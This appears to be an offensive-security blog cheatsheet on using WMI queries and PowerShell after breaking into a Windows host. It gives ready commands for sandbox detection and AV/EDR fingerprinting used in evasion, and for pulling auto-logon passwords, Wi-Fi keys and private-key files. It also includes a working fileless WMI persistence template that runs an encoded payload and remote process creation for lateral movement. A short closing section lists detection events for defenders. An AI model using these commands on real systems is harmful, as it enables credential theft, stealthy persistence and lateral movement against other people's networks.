---
layout: attack
title: WQL Looting & Recon - Offensive WMI Queries for Situational Awareness
---

<img height="150" align="left" src="/images/wql-recon.png" > Windows Management Instrumentation (WMI) is a powerful built-in Windows subsystem that provides a standardized interface for querying system information, managing configurations, and subscribing to events. WQL (WMI Query Language) is its SQL-like query language. From an offensive perspective, WQL is a goldmine: it runs natively on every Windows host, rarely triggers AV/EDR alerts, requires no additional tooling, and provides deep access to OS internals. This post serves as a comprehensive cheatsheet for using WQL in post-exploitation scenarios to perform reconnaissance, credential hunting, and lateral movement preparation.

## Why WQL for Offensive Operations?

- **Living off the Land (LotL):** WMI is a legitimate system tool. Queries blend into normal admin activity.
- **No binaries to drop:** Everything runs through `wmic.exe`, PowerShell's `Get-WmiObject`/`Get-CimInstance`, or COM objects.
- **Remote execution:** WMI supports remote queries via DCOM/WinRM, making it ideal for lateral movement recon.
- **Deep system access:** Exposes hardware, OS, network, users, processes, services, and more through hundreds of classes.

## Execution Methods

Before diving into queries, here's how to execute WQL in practice:

```powershell
# PowerShell (modern, preferred)
Get-CimInstance -Query "SELECT * FROM Win32_OperatingSystem"

# PowerShell (legacy, still works)
Get-WmiObject -Query "SELECT * FROM Win32_OperatingSystem"

# WMIC command line (deprecated but still present)
wmic os get Caption,Version,OSArchitecture

# Remote execution (requires valid creds + DCOM access)
Get-CimInstance -Query "SELECT * FROM Win32_Process" -ComputerName TARGET -Credential $cred

# From C# / .NET (for custom tooling)
ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process");
```

---

## 1. Infrastructure & Environment Recon

The first step in post-exploitation is understanding where you've landed. Is it a VM? A domain controller? A workstation?

### VM/Sandbox Detection

```sql
SELECT * FROM Win32_ComputerSystem WHERE Model LIKE '%Virtual%' OR Model LIKE '%VMware%'
```

**Why it matters:** Detects if you're in a VM or sandbox. Malware analysis environments typically run in VirtualBox, VMware, or Hyper-V. If detected, an attacker may alter behavior or abort.

**Extended detection** — check BIOS for VM fingerprints:

```sql
SELECT SerialNumber, Manufacturer FROM Win32_BIOS WHERE SerialNumber LIKE '%VMware%' OR Manufacturer LIKE '%Xen%' OR Manufacturer LIKE '%QEMU%'
```

**Check for minimal hardware (sandbox indicator):**

```sql
SELECT NumberOfLogicalProcessors, TotalPhysicalMemory FROM Win32_ComputerSystem
```

*Result interpretation:* A system with 1-2 logical processors and < 4GB RAM is likely a sandbox. (`NumberOfLogicalProcessors` counts cores+hyperthreads, more useful than `NumberOfProcessors` which only counts physical CPU packages.)

### Domain Identification

```sql
SELECT Domain, Workgroup, PartOfDomain FROM Win32_ComputerSystem
```

**Why it matters:** Determines if the host is domain-joined. `PartOfDomain = True` means Active Directory is in play, opening up Kerberos attacks, GPO abuse, and lateral movement. The `Domain` field gives you the FQDN of the AD domain.

### Identify Domain Controller Role

```sql
SELECT * FROM Win32_ComputerSystem WHERE DomainRole = 4 OR DomainRole = 5
```

**DomainRole values decoded:**

| Value | Meaning |
|-------|---------|
| 0 | Standalone Workstation |
| 1 | Member Workstation |
| 2 | Standalone Server |
| 3 | Member Server |
| 4 | Backup Domain Controller |
| 5 | Primary Domain Controller |

**Why it matters:** If you've landed on a DC, you have direct access to NTDS.dit, Group Policy, and all domain secrets.

### OS & Architecture

```sql
SELECT Caption, OSArchitecture, Version FROM Win32_OperatingSystem
```

**Why it matters:** Determines payload architecture (x86 vs x64), OS version for exploit selection, and build number for patch-level assessment.

**Additional OS detail:**

```sql
SELECT BuildNumber, ServicePackMajorVersion, LastBootUpTime FROM Win32_OperatingSystem
```

*`LastBootUpTime` reveals uptime — long uptime may mean unpatched systems.*

### Boot Configuration (UEFI vs Legacy)

```sql
SELECT BootDevice, SystemDevice FROM Win32_ComputerSystem
```

### Time Zone (useful for scheduling payloads)

```sql
SELECT Caption, Bias FROM Win32_TimeZone
```

---

## 2. User & Credential Hunting

### Logged-On Users

```sql
SELECT * FROM Win32_LoggedOnUser
```

**Why it matters:** Shows which user accounts have active sessions. High-value targets include domain admins, service accounts, and IT staff. Their tokens may be stealable via impersonation.

*Note: This is an association class — it returns `Antecedent` (account reference) and `Dependent` (logon session reference) as string paths that need parsing. Combine with `Win32_LogonSession` for full context:*

```powershell
Get-CimInstance -Query "SELECT * FROM Win32_LoggedOnUser" | ForEach-Object {
    "$($_.Antecedent.Name) -> Session $($_.Dependent.LogonId)"
}
```

### Local Accounts & SIDs

```sql
SELECT Name, SID, Disabled FROM Win32_UserAccount
```

**Why it matters:** Enumerates all local accounts. SIDs ending in `-500` are the built-in Administrator (even if renamed). Disabled accounts might be re-enabled. Look for service accounts with weak passwords.

**Filter for enabled accounts only:**

```sql
SELECT Name, SID FROM Win32_UserAccount WHERE Disabled = False AND LocalAccount = True
```

### Logon Sessions

```sql
SELECT * FROM Win32_LogonSession
```

**Why it matters:** Shows active logon sessions with logon type. Type 10 = RDP, Type 3 = Network (e.g., SMB), Type 2 = Interactive. Combined with `Win32_LoggedOnUser`, maps sessions to specific accounts.

**Logon types to look for:**

| LogonType | Meaning | Offensive Value |
|-----------|---------|-----------------|
| 2 | Interactive (console) | Credentials cached in LSASS |
| 3 | Network (SMB/WMI) | No creds cached (NTLMv2 challenge) |
| 7 | Unlock | Credentials cached |
| 10 | RemoteInteractive (RDP) | Credentials cached in LSASS |

### Local Group Membership

```sql
SELECT * FROM Win32_GroupUser WHERE GroupComponent="Win32_Group.Domain='COMPUTERNAME',Name='Administrators'"
```

**Why it matters:** Identifies who has local admin rights — your lateral movement targets.

### Scheduled Tasks (Persistence & Credential Discovery)

```powershell
# Win32_ScheduledTask does NOT exist — use the TaskScheduler namespace (Win8+):
Get-CimInstance -Namespace root/Microsoft/Windows/TaskScheduler -ClassName MSFT_ScheduledTask |
    Select-Object TaskName, TaskPath, State
```

```sql
-- Alternative: query via the MSFT_ScheduledTask class
-- Namespace: root\Microsoft\Windows\TaskScheduler
SELECT TaskName, TaskPath, State FROM MSFT_ScheduledTask
```

**Why it matters:** Scheduled tasks often run as privileged users and may contain plaintext credentials in their command arguments or associated actions. Also reveals existing persistence mechanisms.

**Note:** To extract the actual command/action details, you need to inspect the task XML via `Export-ScheduledTask` or the COM `Schedule.Service` object, as `MSFT_ScheduledTask` stores actions in embedded XML.

### Auto-Logon Credentials (Registry via WMI)

```powershell
# Win32_Registry does NOT support reading individual values — use StdRegProv methods instead:
$reg = [wmiclass]"\\.\root\default:StdRegProv"
# HKLM = 2147483650
$reg.GetStringValue(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultPassword")
$reg.GetStringValue(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultUserName")
$reg.GetStringValue(2147483650, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "DefaultDomainName")
```

**Why it matters:** Systems configured with auto-logon store credentials in plaintext in the registry. Common on kiosk machines, lab environments, and poorly configured servers.

---

## 3. Network & Share Looting

### Network Shares

```sql
SELECT Name, Path, Type FROM Win32_Share
```

**Why it matters:** Reveals accessible file shares. Default shares (`C$`, `ADMIN$`, `IPC$`) indicate admin access. Custom shares may contain sensitive data, backups, or credentials.

**Share Type values:**

| Type | Meaning |
|------|---------|
| 0 | Disk Drive |
| 1 | Print Queue |
| 2 | Device |
| 2147483648 | Admin (hidden $) |

### Mapped Drives

```sql
SELECT LocalName, RemoteName, Status FROM Win32_NetworkConnection
```

*Alternative for drive-letter mappings only:*

```sql
SELECT Name, ProviderName FROM Win32_MappedLogicalDisk
```

**Why it matters:** Shows mapped network drives — reveals file servers, NAS devices, and departmental shares the user has access to. Great for data exfiltration planning.

### IP & MAC Configuration

```sql
SELECT IPAddress, IPSubnet, MACAddress, DefaultIPGateway, DNSServerSearchOrder FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True
```

**Why it matters:** Maps the network topology. Multiple NICs may indicate dual-homed hosts (pivot points). DNS servers often point to domain controllers.

### RDP Status

```powershell
# Namespace: root\cimv2\TerminalServices (NOT the default root\cimv2)
Get-CimInstance -Namespace root/cimv2/TerminalServices -ClassName Win32_TerminalServiceSetting
```

```sql
-- Must connect to root\cimv2\TerminalServices namespace first
SELECT AllowTSConnections FROM Win32_TerminalServiceSetting
```

**Why it matters:** Checks if RDP is enabled (`AllowTSConnections = 1`). If so, you can RDP in with stolen creds for a full interactive session.

### Active Network Connections (like netstat)

```sql
SELECT LocalAddress, LocalPort, RemoteAddress, RemotePort, State FROM MSFT_NetTCPConnection
```

*Namespace: `root\StandardCimv2`*

### DNS Cache

```sql
SELECT * FROM MSFT_DNSClientCache
```

*Namespace: `root\StandardCimv2` — reveals recently resolved hostnames, mapping internal infrastructure.*

### Wireless Profiles (potential credential recovery)

```powershell
# The old MSNdis_80211_ServiceSetIdentifier WMI class is deprecated/removed on modern Windows.
# Use netsh instead for wireless profile enumeration and credential extraction:
netsh wlan show profiles
netsh wlan show profile name="ProfileName" key=clear

# Or via WMI, enumerate network adapters with wireless capability:
Get-CimInstance -Query "SELECT Name, NetConnectionID FROM Win32_NetworkAdapter WHERE NetConnectionID LIKE '%Wi-Fi%'"
```

---

## 4. Software & Security Discovery

### AV / Firewall Status

```sql
SELECT displayName, productState FROM AntiVirusProduct
```

*Namespace: `root\SecurityCenter2` (not the default `root\cimv2`)*

```powershell
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
```

**Why it matters:** Identifies which security products are active. `productState` is a bitmask — decoding it reveals if AV is enabled/up-to-date. Critical for choosing evasion techniques.

**productState decoding (hex):**

| Bits | Meaning |
|------|---------|
| `0x1000` | AV enabled |
| `0x0010` | Definitions up to date |
| `0x0100` | AV disabled |

### Installed Software

```sql
SELECT Caption, Version FROM Win32_SoftwareFeature
```

**Note:** Both `Win32_SoftwareFeature` and `Win32_Product` are extremely slow (they enumerate MSI packages and can trigger reconfiguration checks). For faster, more complete results:

```powershell
# Preferred: query Uninstall registry keys via StdRegProv or PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
    Select-Object DisplayName, DisplayVersion, Publisher

# WQL alternative (slow, use only when needed):
SELECT Name, Version, Vendor FROM Win32_Product
```

**Why it matters:** Identifies vulnerable software versions, security tools to evade, remote access tools already installed (TeamViewer, AnyDesk), and development tools (compilers for on-host payload compilation).

### Running Processes

```sql
SELECT Name, ProcessId, CommandLine, ExecutablePath, ParentProcessId FROM Win32_Process
```

**Why it matters:** Reveals security tools (MsMpEng.exe, CrowdStrike falcon, Sysmon), admin tools, and process command lines that may leak credentials or paths.

**Hunt for specific security products:**

```sql
SELECT Name, ProcessId FROM Win32_Process WHERE Name LIKE '%MsMpEng%' OR Name LIKE '%csfalcon%' OR Name LIKE '%cb%' OR Name LIKE '%cylance%' OR Name LIKE '%sysmon%'
```

### Hotfixes / Patches

```sql
SELECT HotFixID, Description, InstalledOn FROM Win32_QuickFixEngineering
```

**Why it matters:** Reveals patch level. Cross-reference with known CVEs to find privilege escalation or RCE opportunities. Sort by `InstalledOn` to find how stale the patching is.

### Services (Privilege Escalation Opportunities)

```sql
SELECT Name, StartName, PathName, State FROM Win32_Service WHERE StartMode = 'Auto'
```

**Why it matters:** Services running as `LocalSystem` with unquoted paths or writable directories are classic privesc vectors.

**Find services with unquoted paths:**

```sql
SELECT Name, PathName FROM Win32_Service WHERE PathName LIKE '% %' AND PathName NOT LIKE '"%%'
```

*Note: WQL syntax requires `column NOT LIKE` — not `NOT column LIKE`. The `%%` escapes the percent after the quote character.*

### Drivers (Vulnerable Driver Hunting - BYOVD)

```sql
SELECT Name, PathName, ServiceType FROM Win32_SystemDriver
```

---

## 5. File & Secret Hunting

### Search Config Files

```sql
SELECT Name, Path FROM CIM_DataFile WHERE (Extension = 'config' OR Extension = 'ini' OR Extension = 'xml') AND Drive = 'C:'
```

**Why it matters:** Config files often contain database connection strings, API keys, and plaintext credentials. Target `web.config`, `app.config`, and custom `.ini` files.

**Warning:** `CIM_DataFile` queries are SLOW on large drives. Scope to specific directories when possible:

```sql
SELECT Name FROM CIM_DataFile WHERE Path = '\\Users\\Administrator\\Desktop\\' AND Extension = 'txt'
```

### Search for Crypto Keys & Password Databases

```sql
SELECT Name, Path FROM CIM_DataFile WHERE (Extension = 'pub' OR Extension = 'pem' OR Extension = 'key' OR Extension = 'kdbx' OR Extension = 'ppk') AND Drive = 'C:'
```

**Why it matters:** `.kdbx` = KeePass databases, `.pem`/`.key`/`.ppk` = SSH/TLS private keys. These are high-value loot.

### Startup Commands (Persistence Discovery)

```sql
SELECT Caption, Command, User, Location FROM Win32_StartupCommand
```

**Why it matters:** Shows what runs at login — reveals existing persistence and potential DLL hijack opportunities. The `User` field shows privilege level.

### Search for Scripts with Potential Credentials

```sql
SELECT Name, Path FROM CIM_DataFile WHERE (Extension = 'ps1' OR Extension = 'bat' OR Extension = 'vbs') AND Drive = 'C:'
```

### Recently Modified Files (Active Work)

```sql
SELECT Name, LastModified FROM CIM_DataFile WHERE Drive = 'C:' AND Path = '\\Users\\Administrator\\Documents\\' AND LastModified > '20260101000000.000000+000'
```

*Note: `CIM_DataFile` queries are non-recursive — `Path` matches only that exact directory. Always scope to specific paths to avoid timeouts. The DMTF datetime format (`YYYYMMDDHHmmss.ffffff+UUU`) is used for comparisons.*

---

## 6. WMI Event Subscriptions (Persistence)

Beyond reconnaissance, WMI can be weaponized for persistence via event subscriptions — a fileless technique that survives reboots:

```powershell
# Create a permanent WMI event subscription (persistence)
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = 'UpdateCheck'
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
    Name = 'UpdateConsumer'
    CommandLineTemplate = 'powershell.exe -enc <BASE64_PAYLOAD>'
}

Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

**Detection query (find existing WMI persistence):**

```powershell
# These queries run against the root\subscription namespace
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
```

---

## 7. Remote WQL Execution (Lateral Movement Recon)

WQL queries can be executed against remote systems — perfect for mapping an environment without deploying agents:

```powershell
# Sweep a subnet for alive hosts and their OS
$targets = @("DC01","FILE01","WEB01")
foreach ($t in $targets) {
    Get-CimInstance -Query "SELECT Caption, CSName FROM Win32_OperatingSystem" -ComputerName $t -Credential $cred
}
```

**Remote process creation (lateral movement):**

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="powershell.exe -enc PAYLOAD"} -ComputerName TARGET
```

---

## MITRE ATT&CK Mapping

| Technique | ID | WQL Relevance |
|-----------|-----|---------------|
| System Information Discovery | T1082 | OS, hardware, VM detection |
| Account Discovery | T1087 | User enumeration |
| Network Share Discovery | T1135 | Share enumeration |
| Process Discovery | T1057 | Running process listing |
| Security Software Discovery | T1518.001 | AV/EDR detection |
| Software Discovery | T1518 | Installed software |
| Remote Services | T1021 | Remote WMI execution |
| Event Triggered Execution: WMI | T1546.003 | WMI persistence |

---

## Defensive Considerations

If you're a defender reading this, here's what to monitor:

- **WMI Activity Logging:** Enable `Microsoft-Windows-WMI-Activity/Operational` event log
- **Sysmon Event IDs 19-21:** WMI Event Filter/Consumer/Binding creation
- **Event ID 4688:** Process creation with `wmic.exe` or `WmiPrvSE.exe` as parent
- **Network traffic on port 135 (DCOM):** Remote WMI connections
- **Unusual `root\SecurityCenter2` queries:** Indicates attacker fingerprinting your AV

---

## References

- [MITRE ATT&CK - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/)
- [Microsoft WMI Documentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page)
- [FireEye - WMI Offense & Defense](https://www.mandiant.com/resources/windows-management-instrumentation-wmi-offense-defense-and-forensics)
